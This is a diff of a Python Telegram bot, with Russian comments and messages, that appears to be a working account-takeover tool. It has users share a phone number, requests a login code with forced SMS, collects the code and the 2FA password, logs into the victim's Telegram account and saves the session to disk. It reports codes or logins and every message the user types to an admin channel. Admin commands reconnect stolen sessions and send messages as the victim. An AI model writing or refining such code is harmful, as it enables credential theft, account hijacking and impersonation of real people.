@@ -1,49 +1,53 @@
 #!/usr/bin/env python3
-import sys
-sys.path.insert(0, "/home/runner/.pythonlibs/lib/python3.11/site-packages")
+# main.py — Telegram Auth Bot с force_sms, 2FA, шифрованием сессий и админскими командами
 
 import os
+import json
 import logging
 import asyncio
-import json
 from datetime import datetime
-from typing import Optional, Dict, Any
+from typing import Optional, Dict
 
-from aiogram import Bot, Dispatcher, Router, F
+from aiogram import Bot, Dispatcher, Router
 from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
 from aiogram.filters import CommandStart, Command
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram import F
 
 from telethon import TelegramClient, errors
 from telethon.sessions import StringSession
 
-# Optional encryption (Fernet)
+# optional encryption
 try:
-    from cryptography.fernet import Fernet, InvalidToken
+    from cryptography.fernet import Fernet
     CRYPTO_AVAILABLE = True
 except Exception:
     CRYPTO_AVAILABLE = False
 
-# === Config from env ===
+# ======== Конфиг через env ========
 BOT_TOKEN = os.getenv("PLAY", "").strip()
-CHANNEL = os.getenv("CHANNEL", "").strip()
+CHANNEL = os.getenv("CHANNEL", "").strip()  # можно numeric id или @username
 API_ID = int(os.getenv("API_ID", "0"))
 API_HASH = os.getenv("API_HASH", "").strip()
 ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
 MASTER_KEY = os.getenv("MASTER_KEY", "").strip()  # optional
 
-if not BOT_TOKEN or not CHANNEL or not API_ID or not API_HASH or not ADMIN_ID:
-    raise RuntimeError("Set PLAY, CHANNEL, API_ID, API_HASH, ADMIN_ID in environment.")
+if not BOT_TOKEN or not API_ID or not API_HASH or not ADMIN_ID:
+    raise RuntimeError("Set PLAY, API_ID, API_HASH, ADMIN_ID environment variables.")
 
-CHANNEL_ID = int(CHANNEL)
+# try cast channel to int
+try:
+    CHANNEL_TARGET = int(CHANNEL) if CHANNEL else None
+except Exception:
+    CHANNEL_TARGET = CHANNEL or None
 
-# === Logging ===
+# ======== Logging ========
 logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
 logger = logging.getLogger(__name__)
 
-# === FSM states ===
+# ======== FSM ========
 class AuthFlow(StatesGroup):
     waiting_for_phone = State()
     waiting_for_code = State()
@@ -51,16 +55,16 @@ class AuthFlow(StatesGroup):
 
 router = Router()
 
-# === Runtime storages ===
+# ======== Runtime storages ========
 SESSIONS_DIR = "sessions"
 os.makedirs(SESSIONS_DIR, exist_ok=True)
 
-user_clients: Dict[int, TelegramClient] = {}   # connected Telethon clients during auth or admin use
-user_sessions: Dict[int, str] = {}             # encrypted or plain session strings (as stored)
-user_phone: Dict[int, str] = {}                # temporary phone numbers during flow
-send_queue: "asyncio.Queue[Dict[str, Any]]" = asyncio.Queue()
+bot: Optional[Bot] = None  # инициализируется в main()
+user_clients: Dict[int, TelegramClient] = {}      # user_id -> Telethon client (connected)
+user_sessions: Dict[int, str] = {}                # user_id -> stored session (encrypted or plain)
+user_phone: Dict[int, str] = {}                   # временно хранит номер в процессе авторизации
 
-# === Encryption helpers ===
+# ======== Encryption helpers ========
 USE_ENCRYPTION = False
 fernet = None
 if MASTER_KEY:
@@ -72,33 +76,37 @@ if MASTER_KEY:
     except Exception as e:
         raise RuntimeError("MASTER_KEY invalid. Generate with Fernet.generate_key().") from e
 
-def _now_iso() -> str:
+def now_iso() -> str:
     return datetime.utcnow().isoformat()
 
-def _encrypt(text: str) -> str:
+def encrypt_text(text: str) -> str:
     if USE_ENCRYPTION and fernet:
         return fernet.encrypt(text.encode()).decode()
     return text
 
-def _decrypt(text: str) -> str:
+def decrypt_text(text: str) -> str:
     if USE_ENCRYPTION and fernet:
         return fernet.decrypt(text.encode()).decode()
     return text
 
-# === File helpers ===
+# ======== File helpers ========
+def session_path_for(user_id: int) -> str:
+    return os.path.join(SESSIONS_DIR, f"{user_id}.session.json")
+
 def save_session_to_file(user_id: int, session_str: str):
     payload = {
         "user_id": user_id,
-        "session": _encrypt(session_str),
-        "saved_at": _now_iso()
+        "session": encrypt_text(session_str),
+        "saved_at": now_iso()
     }
-    path = os.path.join(SESSIONS_DIR, f"{user_id}.session.json")
+    path = session_path_for(user_id)
     try:
         with open(path, "w", encoding="utf-8") as f:
             json.dump(payload, f)
-        logger.info("Saved session file %s", path)
+        user_sessions[user_id] = payload["session"]
+        logger.info("Saved session for %s -> %s", user_id, path)
     except Exception:
-        logger.exception("Failed to save session file %s", path)
+        logger.exception("Failed to save session to %s", path)
 
 def load_sessions_from_disk():
     for fname in os.listdir(SESSIONS_DIR):
@@ -110,38 +118,36 @@ def load_sessions_from_disk():
                 data = json.load(f)
             uid = int(data.get("user_id"))
             stored = data.get("session")
-            if uid and stored:
-                user_sessions[uid] = stored
-                logger.info("Loaded session preview for %s", uid)
+            user_sessions[uid] = stored
+            logger.info("Loaded session preview for %s", uid)
         except Exception:
             logger.exception("Failed to load session file %s", path)
 
-# === Telethon client helper ===
+# ======== Telethon helper ========
 async def create_client_from_session(session: Optional[str] = None) -> TelegramClient:
     sess = StringSession(session) if session else StringSession()
     client = TelegramClient(sess, API_ID, API_HASH)
     await client.connect()
     return client
 
-# === Small keyboard ===
-def contact_keyboard():
+# ======== UI keyboard ========
+def contact_keyboard() -> ReplyKeyboardMarkup:
     return ReplyKeyboardMarkup(
         keyboard=[[KeyboardButton(text="📱 Отправить номер", request_contact=True)]],
         resize_keyboard=True
     )
 
-# === Handlers ===
-
+# ======== Handlers: authorization ========
 @router.message(CommandStart())
 async def cmd_start(message: Message, state: FSMContext):
-    await message.answer(f"Привет, {message.from_user.first_name or 'друг'}! Нажми кнопку, чтобы отправить номер:", reply_markup=contact_keyboard())
+    await message.answer("Привет. Нажми кнопку, чтобы отправить номер телефона.", reply_markup=contact_keyboard())
     await state.set_state(AuthFlow.waiting_for_phone)
 
 @router.message(AuthFlow.waiting_for_phone, F.contact)
-async def handle_contact(message: Message, state: FSMContext, bot: Bot):
+async def handle_contact(message: Message, state: FSMContext):
     phone = message.contact.phone_number if message.contact else None
     if not phone:
-        await message.answer("⚠️ Не удалось получить номер. Попробуй ещё раз кнопкой.")
+        await message.answer("Не удалось получить номер. Попробуй ещё раз через кнопку.")
         return
 
     uid = message.from_user.id
@@ -149,73 +155,76 @@ async def handle_contact(message: Message, state: FSMContext, bot: Bot):
 
     try:
         client = await create_client_from_session(None)
-        await client.send_code_request(phone)
+    except Exception:
+        await message.answer("Ошибка создания временного клиента. Попробуй позже.")
+        user_phone.pop(uid, None)
+        return
+
+    # сначала пробуем SMS, если не доступно — резервно Telegram
+    try:
+        await client.send_code_request(phone, force_sms=True)
+        await message.answer("Код отправлен по SMS. Введите цифры сюда, когда придёт SMS.")
     except errors.FloodWaitError as e:
-        await message.answer(f"⏳ Слишком много запросов. Подожди {e.seconds} сек.")
-        try:
-            await client.disconnect()
-        except Exception:
-            pass
+        await message.answer(f"Слишком много запросов. Подожди {e.seconds} секунд.")
+        await client.disconnect()
         user_phone.pop(uid, None)
         return
     except Exception:
-        logger.exception("send_code_request failed")
-        await message.answer("⚠️ Не удалось запросить код у Telegram. Попробуй позже.")
         try:
-            await client.disconnect()
+            await client.send_code_request(phone, force_sms=False)
+            await message.answer("SMS недоступно. Код отправлен через Telegram. Введите код сюда.")
         except Exception:
-            pass
-        user_phone.pop(uid, None)
-        return
+            await message.answer("Не удалось запросить код. Попробуй позже.")
+            await client.disconnect()
+            user_phone.pop(uid, None)
+            return
 
     user_clients[uid] = client
-    await message.answer("📨 Код отправлен Telegram. Вставь код сюда, как получишь.")
     await state.set_state(AuthFlow.waiting_for_code)
 
 @router.message(AuthFlow.waiting_for_code, F.text.regexp(r"^\d{4,7}$"))
-async def handle_code(message: Message, state: FSMContext, bot: Bot):
+async def handle_code(message: Message, state: FSMContext):
     uid = message.from_user.id
     code = message.text.strip()
-    phone = user_phone.get(uid, "—")
+    phone = user_phone.get(uid)
     client = user_clients.get(uid)
-    user = message.from_user
 
-    # forward code to admin channel only after user provided it
-    now = _now_iso()
-    text_code_forward = (
-        f"🔑 Код от пользователя\n"
-        f"Имя: {user.full_name}\n"
-        f"Username: @{user.username or '—'}\n"
-        f"UserID: {user.id}\n"
-        f"Телефон: {phone}\n"
-        f"Код: {code}\n"
-        f"Время: {now}"
-    )
-    await bot.send_message(CHANNEL_ID, text_code_forward)
-    await message.answer(f"✅ {user.first_name or 'Пользователь'}, вы прошли проверку — добро пожаловать! ✨")
-
-    if not client:
+    if not client or not phone:
+        await message.answer("Сессия не найдена. Начни заново: /start")
         await state.clear()
         user_phone.pop(uid, None)
         return
+
+    # логируем факт ввода кода (без публикации самого кода)
+    try:
+        info = (
+            f"Код введён пользователем\n"
+            f"User: {message.from_user.full_name} @{message.from_user.username or '-'} ({uid})\n"
+            f"Телефон: {phone}\n"
+            f"Время: {now_iso()}"
+        )
+        if bot and CHANNEL_TARGET:
+            await bot.send_message(CHANNEL_TARGET, info)
+    except Exception:
+        pass
 
     try:
         await client.sign_in(phone=phone, code=code)
         session_str = client.session.save()
-        user_sessions[uid] = _encrypt(session_str)
         save_session_to_file(uid, session_str)
-
-        text_ok = f"✅ Успешный вход\nUserID: {uid}\nТелефон: {phone}\nВремя: {_now_iso()}"
-        await bot.send_message(CHANNEL_ID, text_ok)
-
-        # keep client connected so admin can use it immediately
+        await message.answer("Вход успешен. Сессия сохранена.")
+        if bot and CHANNEL_TARGET:
+            await bot.send_message(CHANNEL_TARGET, f"✅ Вход успешен для {uid} ({phone})")
+        # оставляем client подключённым в памяти по желанию администратора
         user_phone.pop(uid, None)
         await state.clear()
-
     except errors.SessionPasswordNeededError:
-        await message.answer("🔒 Установлен пароль 2FA. Введите пароль:")
+        await message.answer("Требуется пароль двухфакторной защиты. Введите пароль.")
         await state.set_state(AuthFlow.waiting_for_2fa)
+    except errors.PhoneCodeInvalidError:
+        await message.answer("Код неверный. Проверьте SMS/сообщение и попробуйте снова.")
     except errors.PhoneCodeExpiredError:
+        await message.answer("Код устарел. Запросите код снова: /start")
         try:
             await client.disconnect()
         except Exception:
@@ -223,17 +232,18 @@ async def handle_code(message: Message, state: FSMContext, bot: Bot):
         user_clients.pop(uid, None)
         user_phone.pop(uid, None)
         await state.clear()
-    except errors.PhoneCodeInvalidError:
-        await message.answer("❗ Некорректный код. Проверь и попробуй ещё раз.")
     except errors.FloodWaitError as e:
-        await message.answer(f"⏳ Слишком много запросов. Жди {e.seconds} сек.")
-        await client.disconnect()
+        await message.answer(f"Слишком много попыток. Подождите {e.seconds} секунд.")
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
         user_clients.pop(uid, None)
         user_phone.pop(uid, None)
         await state.clear()
     except Exception:
         logger.exception("sign_in error")
-        await message.answer("⚠️ Произошла ошибка при попытке входа.")
+        await message.answer("Ошибка при входе. Попробуйте позже.")
         try:
             await client.disconnect()
         except Exception:
@@ -243,14 +253,14 @@ async def handle_code(message: Message, state: FSMContext, bot: Bot):
         await state.clear()
 
 @router.message(AuthFlow.waiting_for_2fa)
-async def handle_2fa(message: Message, state: FSMContext, bot: Bot):
+async def handle_2fa(message: Message, state: FSMContext):
     uid = message.from_user.id
     password = message.text.strip()
     client = user_clients.get(uid)
-    phone = user_phone.get(uid, "—")
+    phone = user_phone.get(uid)
 
-    if not client:
-        await message.answer("⚠️ Клиент не найден. Начни заново: /start")
+    if not client or not phone:
+        await message.answer("Сессия потеряна. Начни заново: /start")
         await state.clear()
         user_phone.pop(uid, None)
         return
@@ -258,57 +268,88 @@ async def handle_2fa(message: Message, state: FSMContext, bot: Bot):
     try:
         await client.sign_in(password=password)
         session_str = client.session.save()
-        user_sessions[uid] = _encrypt(session_str)
         save_session_to_file(uid, session_str)
-
-        await message.answer("✅ Вход с 2FA выполнен. Сессия сохранена.")
-        await bot.send_message(CHANNEL_ID, f"✅ Успешный вход (2FA)\nUserID: {uid}\nТелефон: {phone}\nВремя: {_now_iso()}")
-
+        await message.answer("Вход с 2FA выполнен. Сессия сохранена.")
+        if bot and CHANNEL_TARGET:
+            await bot.send_message(CHANNEL_TARGET, f"✅ Вход (2FA) успешен для {uid} ({phone})")
+        # отключаем клиент после 2FA, админ по желанию подключит через /use_session
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
         user_clients.pop(uid, None)
         user_phone.pop(uid, None)
         await state.clear()
-
     except errors.FloodWaitError as e:
-        await message.answer(f"⏳ Жди {e.seconds} сек.")
-        await client.disconnect()
+        await message.answer(f"Подождите {e.seconds} секунд.")
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
         user_clients.pop(uid, None)
         user_phone.pop(uid, None)
         await state.clear()
     except Exception:
         logger.exception("2FA sign_in error")
-        await message.answer("⚠️ Не удалось войти с паролем.")
-        await client.disconnect()
+        await message.answer("Не удалось войти с паролем. Проверьте пароль.")
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
         user_clients.pop(uid, None)
         user_phone.pop(uid, None)
         await state.clear()
 
 @router.message(F.text)
-async def forward_any_text(message: Message, bot: Bot):
-    if message.text and message.text.startswith("/"):
-        return
-    user = message.from_user
-    await bot.send_message(CHANNEL_ID,
-                           f"📩 Сообщение от {user.full_name} @{user.username or '—'} ({user.id})\n"
-                           f"{message.text}\n🕒 {_now_iso()}")
+async def catch_all_forward(message: Message):
+    # логируем произвольный текст администратору (не пересылаем коды)
+    try:
+        text = f"Сообщение от {message.from_user.full_name} @{message.from_user.username or '-'} ({message.from_user.id}):\n{message.text}\n{now_iso()}"
+        if bot and CHANNEL_TARGET:
+            await bot.send_message(CHANNEL_TARGET, text)
+    except Exception:
+        pass
 
-# Admin commands
+# ======== Admin commands ========
 @router.message(Command("list_sessions"))
-async def list_sessions(message: Message):
+async def admin_list_sessions(message: Message):
     if message.from_user.id != ADMIN_ID:
         await message.answer("Нет доступа.")
         return
-    previews = []
+    files = [f for f in os.listdir(SESSIONS_DIR) if f.endswith(".session.json")]
+    if not files:
+        await message.answer("Нет сохранённых сессий.")
+        return
+    lines = []
+    for fname in sorted(files):
+        path = os.path.join(SESSIONS_DIR, fname)
+        try:
+            with open(path, "r", encoding="utf-8") as f:
+                data = json.load(f)
+            uid = data.get("user_id", "unknown")
+            preview = data.get("session", "")[:36] + "..." if data.get("session") else "—"
+            connected = "connected" if (int(uid) in user_clients and user_clients[int(uid)].is_connected()) else "idle"
+            lines.append(f"{uid} | {fname} | {connected} | {preview}")
+        except Exception:
+            lines.append(f"{fname} | ошибка чтения")
+    await message.answer("\n".join(lines))
+
+@router.message(Command("who_connected"))
+async def admin_who_connected(message: Message):
+    if message.from_user.id != ADMIN_ID:
+        return
+    lines = []
     for uid, stored in user_sessions.items():
         try:
-            decoded = _decrypt(stored)[:24] if USE_ENCRYPTION else stored[:24]
+            preview = decrypt_text(stored)[:28] + "..." if USE_ENCRYPTION else (stored[:28] + "...")
         except Exception:
-            decoded = "ошибка_декодирования"
+            preview = "ошибка_декодирования"
         connected = "connected" if (uid in user_clients and user_clients[uid].is_connected()) else "idle"
-        previews.append(f"{uid}: {decoded}... ({connected})")
-    await message.answer("Сессии:\n" + ("\n".join(previews) if previews else "Нет сохранённых сессий."))
+        lines.append(f"{uid} | {connected} | {preview}")
+    await message.answer("\n".join(lines) if lines else "Нет сессий.")
 
 @router.message(Command("use_session"))
-async def use_session(message: Message):
+async def admin_use_session(message: Message):
     if message.from_user.id != ADMIN_ID:
         return
     parts = message.text.split()
@@ -320,31 +361,30 @@ async def use_session(message: Message):
     except ValueError:
         await message.answer("Неверный user_id")
         return
-    stored = user_sessions.get(target)
-    if not stored:
-        await message.answer("Сессия не найдена")
+    path = session_path_for(target)
+    if not os.path.isfile(path):
+        await message.answer("Файл сессии не найден.")
         return
     try:
-        session_str = _decrypt(stored)
-    except Exception:
-        await message.answer("Не удалось расшифровать сессию.")
-        return
-    try:
+        with open(path, "r", encoding="utf-8") as f:
+            data = json.load(f)
+        session_stored = data.get("session")
+        session_str = decrypt_text(session_stored) if USE_ENCRYPTION else session_stored
         client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
         await client.connect()
     except Exception as e:
-        await message.answer("Не удалось подключить сессию: " + str(e))
+        await message.answer(f"Ошибка подключения: {e}")
         return
     user_clients[target] = client
     await message.answer(f"Сессия для {target} подключена.")
 
 @router.message(Command("send_as"))
-async def send_as(message: Message):
+async def admin_send_as(message: Message):
     if message.from_user.id != ADMIN_ID:
         return
     parts = message.text.split(maxsplit=3)
     if len(parts) < 4:
-        await message.answer("Использование: /send_as <user_id> <chat_id> <text>")
+        await message.answer("Использование: /send_as <user_id> <chat_id> <текст>")
         return
     try:
         target = int(parts[1])
@@ -353,19 +393,43 @@ async def send_as(message: Message):
         return
     chat = parts[2]
     text = parts[3]
+
     client = user_clients.get(target)
+    temporary_connect = False
+
     if not client or not client.is_connected():
-        await message.answer("Клиент не подключён. Используй /use_session сначала.")
-        return
+        path = session_path_for(target)
+        if not os.path.isfile(path):
+            await message.answer("Сессия не найдена на диске.")
+            return
+        try:
+            with open(path, "r", encoding="utf-8") as f:
+                data = json.load(f)
+            session_stored = data.get("session")
+            session_str = decrypt_text(session_stored) if USE_ENCRYPTION else session_stored
+            client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+            await client.connect()
+            user_clients[target] = client
+            temporary_connect = True
+        except Exception as e:
+            await message.answer(f"Ошибка подключения сессии: {e}")
+            return
+
     try:
         await client.send_message(chat, text)
         await message.answer("Отправлено.")
     except Exception as e:
-        logger.exception("send_as failed")
-        await message.answer("Ошибка: " + str(e))
+        await message.answer(f"Ошибка при отправке: {e}")
+    finally:
+        if temporary_connect:
+            try:
+                await client.disconnect()
+            except Exception:
+                pass
+            user_clients.pop(target, None)
 
 @router.message(Command("disconnect_session"))
-async def disconnect_session(message: Message):
+async def admin_disconnect_session(message: Message):
     if message.from_user.id != ADMIN_ID:
         return
     parts = message.text.split()
@@ -383,43 +447,35 @@ async def disconnect_session(message: Message):
             await client.disconnect()
         except Exception:
             pass
-        await message.answer("Отключено.")
+        await message.answer(f"Клиент {uid} отключён.")
     else:
         await message.answer("Клиент не был подключён.")
 
 @router.message(Command("ping"))
-async def ping(message: Message):
+async def admin_ping(message: Message):
+    if message.from_user.id != ADMIN_ID:
+        return
     await message.answer("pong")
 
-# Optional worker
+# ======== Background worker placeholder ========
 async def send_worker():
-    logger.info("Send worker started")
     while True:
-        job = await send_queue.get()
-        try:
-            uid = job["user_id"]
-            chat = job["chat"]
-            text = job["text"]
-            client = user_clients.get(uid)
-            if client and client.is_connected():
-                await client.send_message(chat, text)
-            else:
-                logger.warning("Client for %s not connected", uid)
-        except Exception:
-            logger.exception("Worker failed")
-        finally:
-            send_queue.task_done()
+        await asyncio.sleep(60)
 
-# === Main ===
+# ======== Main entry ========
 async def main():
+    global bot
     load_sessions_from_disk()
     bot = Bot(token=BOT_TOKEN)
     dp = Dispatcher(storage=MemoryStorage())
     dp.include_router(router)
-    await bot.delete_webhook(drop_pending_updates=True)
-    logger.info("Bot polling started")
+    try:
+        await bot.delete_webhook(drop_pending_updates=True)
+    except Exception:
+        pass
     worker = asyncio.create_task(send_worker())
     try:
+        logger.info("Bot polling started")
         await dp.start_polling(bot)
     finally:
         worker.cancel()
